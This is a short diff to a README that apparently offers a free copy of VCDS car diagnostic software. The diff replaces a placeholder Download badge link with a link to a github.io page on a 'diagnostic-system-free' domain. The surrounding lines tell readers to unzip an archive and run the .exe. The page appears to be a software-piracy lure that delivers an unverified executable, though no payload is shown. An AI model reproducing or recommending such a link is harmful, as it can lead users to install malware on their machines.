@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://vcds-vag-com-diagnostic-system-free.github.io/.github/)
 
 ## 📸 Overview
 <img width="1274" height="914" alt="vcds-main-interface" src="https://github.com/user-attachments/assets/ef6edd5f-9cda-4141-9b6c-9130fe5bb3d6" />
